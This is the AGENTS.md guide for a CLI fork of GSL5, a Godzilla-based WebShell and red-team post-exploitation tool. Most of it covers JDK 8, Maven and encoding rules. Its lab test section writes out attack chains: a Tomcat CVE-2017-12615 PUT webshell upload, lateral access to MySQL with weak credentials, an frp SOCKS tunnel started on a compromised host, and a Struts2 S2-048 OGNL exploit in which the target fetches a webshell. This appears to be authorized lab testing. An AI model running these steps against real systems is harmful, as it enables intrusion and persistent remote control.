# AGENTS.md — AI 协作开发准则（GSL5 / GodzillaSuper-cli）

> 本文件是 AI 助手在本仓库工作的**最高行为准则**。开始任何任务前必须通读；与其它文档冲突时，以本文「硬性约束」为准。
> 方案文档链：[docs/MCP-改造分析-stdio与CLI.md](docs/MCP-改造分析-stdio与CLI.md)（可行性论证）→ [docs/CLI化改造方案.md](docs/CLI化改造方案.md)（决策 v1）→ [docs/CLI化改造实施方案.md](docs/CLI化改造实施方案.md)（**实施规格 v2，实施以此为准**）。

---

## 0. 项目速览

- **GSL5**（Godzilla Super Loader 5）：基于 Godzilla 深度二次开发的 WebShell 管理与红队后渗透平台。Java Swing GUI + 内置 MCP HTTP/SSE 服务 + `gsl5://` 分享链接 + 团队协作审计。**仅供授权安全测试与研究使用**。
- 本仓库**只维护 `src/` 源码**：不含预编译 jar、不含 `lib/`/`bin/` 依赖、`src/META-INF/MANIFEST.MF` 声明 `Main-Class: core.Gsl5Main`。
- 本仓库是 GSL5 的 **CLI 化 fork**：为 agent/自动化提供 CLI 单一能力源（决策见 docs/，术语已从 project 更名 **task**，`--task` 可选、缺省 `default`）。CLI 工作全部在 `cli` 分支进行，`main` 保持镜像不落提交。

---

## 1. 硬性约束（违反即返工）

### 1.1 一切基于 JDK 8

- 全部源码与依赖必须 **JDK 8 字节码兼容**：`maven.compiler.source = 1.8`、`maven.compiler.target = 1.8`。
- **禁用 JDK 9+ 语法与 API**：`var`、switch 表达式、text blocks、record、`List.of/Map.of/Set.of`、`Stream.toList()`、`Files.readString/writeString`、`String.isBlank/strip/repeat/lines`、`Optional.or/ifPresentOrElse`、`Predicate.not`、接口 private 方法等。`Files.readAllBytes`（JDK 7）可用（现有代码大量使用）。
- 构建/运行统一 **JDK 8**（本机 `java-8-openjdk` 或 Zulu 8，`JAVA_HOME` 必须指向它）。**禁止**用 JDK 11+ 编译"反正能过"——字节码版本与 API 语义都可能漂移，交付物必须能在 JDK 8 运行时启动。
- 新增第三方依赖必须选 JDK 8 兼容版本线（snakeyaml 1.x、okhttp 3.x/4.x、hutool 5.x、sqlite-jdbc 3.x 等），并在 pom 中注释选型理由。

### 1.2 一律使用 Maven 构建与打包

- **Maven 是唯一构建路径**：`mvn clean package`。README「编译与构建」的三段手工 javac 仅为历史参考，**不得作为交付流程**。
- 交付物为 **uber-jar（fat jar，必须包含全部依赖库）**：`maven-shade-plugin` 收敛所有 runtime 依赖；`ManifestResourceTransformer` 写入 `Main-Class: core.Gsl5Main`；过滤签名文件（`*META-INF/*.SF, *.DSA, *.RSA`）与 `module-info.class`；`finalName` 设为 `gsl5`。
- **资源必须随 jar 打包且路径与 src 内一致**（代码按 classpath 绝对路径读取，如 `/data/av.json`、`/core/c2profile/profileTemplate/*.profile`、`/images/tabs/*.svg`）。`<sourceDirectory>src</sourceDirectory>` 下用 `<resources>` 显式纳入全部非 java 资产：`.svg/.properties/.bin/.dll/.classs/.aspx/.ashx/.cs/.soap/.profile/.javax/.exe/.jar`。
  - ⚠️ **`src/shells/plugins/java/assets/asm/**` 的松散 `.class` 不得打进 jar**（实测修正，2026-09）：它们是 `assets/asm.jar` 的构建原料（jar 经 `**/*.jar` 照常打包）；若按 `shells/.../asm/**` 路径打包，`CoreClassLoader` 会以资源路径 defineClass 触发 `wrong name` NoClassDefFoundError。上游 Release jar 也不含这些路径。
- **双编码编译（本仓库特有，必须处理）**：源码树是 UTF-8 为主 + 8 个 GBK 文件的混合体（实测普查，见 §1.4）。pom 基线：`maven-compiler-plugin` 默认执行 **UTF-8** 并 exclude GBK 清单，另加一个同 phase 的 compiler 执行 **GBK** 只编译该清单（或等效机制）。**禁止**为图省事全库重编码为 UTF-8——那会让上游合并变成全树冲突。
- 非 Central 依赖处置（**已实施**，2026-09）：
  1. 第三方依赖统一来自 `com.gsl5.thirdparty:origin-libs:3.1.8`——从上游 Release jar（`origin-jar/gsl5.jar`，本地参考件，**已 gitignore 永不入库**）提取全部第三方类树，并**剔除所有在 src 有对应 .java 的类**（零重叠校验），`mvn install:install-file` 装入本地仓库。这样 76 个 src 缺失的上游类（`core.imp`/`core.socketHook`/大量 UI 组件等）直接以 proven 字节码参与编译与运行，src 里存在的类由我们的源码编译。
  2. 例外规则：8 个 GBK 源文件的**类**保留在 origin-libs 中（default-pass 编译时被同包引用，需类文件解析签名；GBK 二遍编译后覆盖 target/classes）。
  3. 新依赖准入仍需 JDK8 兼容与必要性论证；**禁止 `system` scope**（shade 打不进 uber-jar）。

### 1.3 源码完整性缺口（已实施状态）

- src 是上游源码的**真子集**：imports 对照实测共 **76 个类**在 src 中无源（`core.imp`/`core.annotation` 基础注解/`core.shell.cache`/`core.c2profile` 主类/大量 UI 组件/`util.Log`/`util.Javac` 等），另有 `shells/plugins/generic/EasySocksProxy` 等基类。
- 处置分两层（均已落地）：
  1. **CLI 路径关键类以源码重建**（CFR 反编译 `origin-jar/gsl5.jar`，带出处横幅随 fork 版本化）：`core/ProxyT.java`（代理词汇实测为 `NO_PROXY/HTTP/SOCKS/GLOBAL_PROXY`；`Db.tryGetSetingValue`→`getSetingValue` 适配）、`core/EasyI18N.java`（+`core/annotation/I18NAction|NoI18N` + `godzilla_en/zh.properties` 资源束）、`core/GodzillaObjectInputFilter.java`（含内部类，JDK8 反射式 JEP290）。
  2. **其余 73 个类**经 origin-libs 字节码参与编译运行（见 §1.2）。
- 注意 `assets/asm/**` 松散 .class 是 `asm.jar` 的构建原料：**不得**以 `shells/.../asm/` 路径打进 jar（pom resources 已注明；打进会触发 CoreClassLoader "wrong name" NoClassDefFoundError）。

### 1.4 文件编码纪律（改文件前先看此节）

实测普查（2026-09）：含非 ASCII 的 51 个 `.java` 中 **43 个 UTF-8、8 个 GBK**。README「源码默认 GBK，仅 McpService 为 UTF-8」的说法**已过时**，不要据此决策。

**8 个 GBK 文件清单（编辑只限 ASCII 补丁，禁止触发整文件重编码）**：

```text
src/shells/plugins/java/ClassLoader.java
src/shells/plugins/java/OaTools.java
src/shells/plugins/generic/Useradd.java
src/shells/plugins/generic/ISECUREController.java
src/shells/plugins/csharp/OaTools.java
src/core/MigrateDb.java
src/core/ui/component/ShellRSFilePanel.java
src/core/shellprocessor/jspescapes/ChooseEscapes.java
```

- 新建文件一律 **UTF-8**；源码内中文优先 `\uXXXX` 转义（与 `McpService.java` 现状一致，最小化编码面）。
- 编辑 GBK 清单文件用 `sed` 或等效方式做 ASCII-only 补丁；任何编辑后用 `file`/`iconv` 复核落盘编码未变。
- 不确定文件编码时**先探测再动手**（`iconv -f UTF-8 -t UTF-8 <file>` 可验证即为 UTF-8）。

---

## 2. 开发工作流（AI 必须遵守）

1. **动手前**：读 docs/ 方案链，确认任务落在 v2 实施规格的哪个阶段/交付物内；对照 §1 硬性约束。
2. **改动最小化**：对既有文件的 in-place diff 保持**追加式单点插入**（Gsl5Main 分支 / McpService 类末尾 seam / Db static 块 / OperationLogStore 一行——当前全部计划改动仅此 4 处）；新逻辑一律进新文件（如 `CliMain.java`）；seam 失效必须编译期暴露，禁止反射绕过。
3. **提交纪律**：`cli` 分支原子提交（cli-core / db-pragma / audit-dir / wrapper+docs 分开）；tag 规范 `<上游版本>+cli.<序号>`；上游合并后必跑重建 + compat-golden（v2 §8）。
4. **禁止事项**：
   - 不提交任何凭据/Token/真实 shell 配置/`data.db`/`operation_audit.db`/`profile/` 生成物；
   - 不改 `McpService` 热区内部逻辑（只允许类末尾追加 seam）；
   - 不引入新依赖除非任务必需且满足 §1.1/§1.2；
   - 不在无授权目标上验证攻击性功能（本地冒烟只用构造数据）。
5. **每次改动后的验证义务（缺一不可，全部通过才算完成）**：

```bash
mvn -q clean package && ls -lh target/gsl5.jar                 # 构建成功
java -jar target/gsl5.jar cli version                          # 单行 JSON 输出
java -jar target/gsl5.jar cli doctor                           # 自检通过（S1 后）
unzip -l target/gsl5.jar | grep -cE "okhttp3/|org/yaml/|com/google/|com/httpProxy/|org/sqlite/|images/tabs/"  # 依赖与资源齐
```

   触及 McpService/CliMain 时另跑 `cli/tests/compat-golden.sh`（S2 后可用）；`mcp` 模式回归（GUI 用户面行为不得破坏）。

---

## 3. Maven 构建基线（pom.xml 必须满足）

```xml
<!-- 关键基线（非完整 pom） -->
<properties>
  <maven.compiler.source>1.8</maven.compiler.source>
  <maven.compiler.target>1.8</maven.compiler.target>
  <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
</properties>
<!-- build：sourceDirectory=src；compiler 默认执行 UTF-8 + exclude §1.4 的 8 个 GBK 文件，
     并加 -sourcepath <空目录> 禁止 javac 隐式源码编译（否则同包引用会把 GBK 文件拉进
     UTF-8 遍触发 unmappable error；被引用类从 origin-libs 类路径解析）；
     第二个 compiler 执行绑定 process-classes（保证在默认遍之后）GBK + include 同清单，
     编译产物覆盖 target/classes；resources 显式纳入 §1.2 所列非 java 资产；
     shade：uber-jar + Main-Class=core.Gsl5Main + 签名过滤 + ServicesResourceTransformer；
     finalName=gsl5 -->
```

**已验证的实现细节（2026-09）**：① GBK 遍必须晚于默认遍（同被引用时默认遍先编译调用方）；② `-sourcepath` 置空是双编码编译成立的关键；③ shade 需 ServicesResourceTransformer 合并 `META-INF/services`（JDBC 驱动自注册）。

**uber-jar 验收清单**：① 关键第三方包在 jar 内（上面验证命令 grep 命中）；② 资源路径原样（抽查 `/data/av.json`、`/core/c2profile/profileTemplate/`、`/images/tabs/`）；③ `java -jar` 三模式冒烟：无参（GUI，有显示环境）/ `mcp`（headless 可启）/ `cli version`；④ `java -version` 为 1.8 时全流程可复现。

---

## 4. 测试与验收

- 一致性回归：`cli/tests/compat-golden.sh`（tools/list 名称集 vs L2 命令表、`call` 与 L2 双路径等价、信封 golden 快照、task 解析矩阵：缺省→`default`/`--task`/env/flag 覆盖 env）。
- 退出码矩阵：`0` 成功 / `2` 用法错误 / `3` 目标失败 / `4` 超时 / `5` 写锁竞争——新增命令必须逐项可触发。
- 新增能力必须**附带可执行验收命令**写入 docs/ 或 SKILL.md；无验收命令的功能视为未完成。

### 4.1 实验室验收测试用例（改造完成后必测）

> **授权前提**：以下目标仅存在于授权实验室拓扑（`192.168.52.0/24` 攻击入口区、`172.31.0.0/24` 内网区）。执行前必须确认当前作业属于该授权范围；**环境不可达时如实记录 `BLOCKED: 环境不可达`，禁止伪造结果**。

**TC1 — 入口 getshell：Tomcat CVE-2017-12615（PUT 上传）→ CLI 接管**

| 步骤 | 命令/动作 | 判定 |
|---|---|---|
| 1 | `gsl5 --task lab-tc1 shell_create --payload JavaDynamicPayload --cryption JAVA_AES_BASE64 --genFile ./shell12615.jsp` | 退出码 0；本地生成 shell 文件 |
| 2 | `curl -X PUT "http://192.168.52.102:8080/shell12615.jsp/" --data-binary @shell12615.jsp`（CVE-2017-12615 的 `/` 绕过后缀） | HTTP 201/200 |
| 3 | `gsl5 --task lab-tc1 shell_add --url http://192.168.52.102:8080/shell12615.jsp --password pass --secretKey key --payload JavaDynamicPayload --cryption JAVA_AES_BASE64` | 退出码 0，返回 Shell ID |
| 4 | `gsl5 --task lab-tc1 shell_info --shellId <ID>` → `shell_test` | 连接成功，返回系统信息 |
| 5 | `gsl5 --task lab-tc1 shell_exec --shellId <ID> --command 'id && hostname'` | 返回命令回显 |

**TC2 — 内网横向：经 WebShell 连内网 MySQL 弱口令**

| 步骤 | 命令/动作 | 判定 |
|---|---|---|
| 1 | 前置：TC1 已获得入口 shell（内网可达 172.31.0.20:3306） | — |
| 2 | `gsl5 --task lab-tc1 db_connect --shellId <ID> --target '172.31.0.20 3306 root 123456 mysql' --configName lab-mysql` | 连接成功（mysql 驱动经 `assets/mysql.jar` 随 payload 下发） |
| 3 | `gsl5 --task lab-tc1 db_exec --shellId <ID> --sql 'select version();' --execType select` | 返回 MySQL 版本行 |
| 4 | `gsl5 --task lab-tc1 db_databases --shellId <ID>` → 任选库 `db_tables` | 返回库/表清单 |

**清理义务**：测试结束后删除入口 shell 文件与 `lab-tc1` task 目录（含 data.db/审计库），并在任务记录中留痕。

**TC3 — 内网二层：frp 隧道穿透 → Struts2 S2-048 getshell（本机经隧道访问）**

> 前置：TC1 入口壳（172.31.0.10，root，双网卡）。隧道机制二选一：GSL5 原生 `JEasySocksProxy`（面板插件，暂无 CLI 面）或上传 frp（CLI 全程可达，**默认走此路径**）。S2-048 的利用（OGNL 命令执行）走 socks 隧道从本机发起；大文件不进 OGNL，shell 文件经入口壳的临时 HTTP 服务由目标拉取。

| 步骤 | 命令/动作 | 判定 |
|---|---|---|
| 1 | 本机 `frps -c frps.toml`（bindPort 7000）；`gsl5 --task lab-tc3 shell_create --genFile shell048.jsp` 备用 | frps 就绪 |
| 2 | 重建 TC1 入口壳并 `shell_add`（壳 A=.10）；`file_upload_local` 上传 frpc 至 `/tmp/frpc`；frpc.toml（server=192.168.52.103:7000，`[[proxies]]` plugin socks5, remotePort=1080）一并上传 | 上传退出码 0 |
| 3 | `shell_exec --command 'chmod +x /tmp/frpc && nohup /tmp/frpc -c /tmp/frpc.toml >/tmp/frpc.log 2>&1 & echo started'` | 回显 started；本机 `ss` 见 frps 连入 |
| 4 | `curl --socks5-hostname 127.0.0.1:1080 -sI http://172.31.0.11:8080/` | HTTP 200/30x，**隧道贯通** |
| 5 | 壳 A：`python3 -m http.server 8081 --directory <shell 目录> &`（供目标拉取 shell 文件）；经隧道对 `http://172.31.0.11:8080/<S2-048 action>` POST OGNL 命令执行 PoC（先 `id` 验证 RCE，再 `curl http://172.31.0.10:8081/shell048.jsp -o <webroot>/shell048.jsp`） | OGNL 回显 `uid=`；webroot 落 shell |
| 6 | `gsl5 --task lab-tc3 shell_add --url http://172.31.0.11:8080/shell048.jsp --password pass --secretKey key --payload JavaDynamicPayload --cryption JAVA_AES_BASE64 --proxyType SOCKS --proxyHost 127.0.0.1 --proxyPort 1080`（**实测 per-shell SOCKS 代理面**） | shell_add 0 |
| 7 | `shell_info --shellId <ID>` → `shell_exec --command 'id && hostname'` | 经隧道返回目标回显 |

**清理义务（TC3 追加）**：OGNL 删除目标 webshell；壳 A 杀 frpc/python http 并删文件；本机停 frps；删 `lab-tc3` task 目录。**经验教训**：删 Tomcat shell 源文件必须同命令删除 `work/` 编译缓存，否则已加载类继续服务。

## 5. 文档同步义务

- 行为/CLI 词汇/构建流程变更，必须同步：[docs/CLI化改造实施方案.md](docs/CLI化改造实施方案.md)（实施规格）与 `cli/SKILL.md`（工具手册）。
- Maven 构建落地后，更新 README「编译与构建」节为 Maven 流程，并修正其过时的编码描述（指明 43 UTF-8 + 8 GBK 实况）——上游合并时保留本仓库侧修改。

## 6. 安全与合规

- 本工具仅供**授权**安全测试与研究；生成/分发 WebShell 与载荷的能力不得用于未授权目标（详见 README 免责声明）。
- 审计是刚需：不得提交绕过审计日志的代码路径；CLI 命令必须落账（v2 §4.2）。
- 共享/发布产物前检查 uber-jar 内不含本地敏感文件（`data.db`、token、任务目录）。
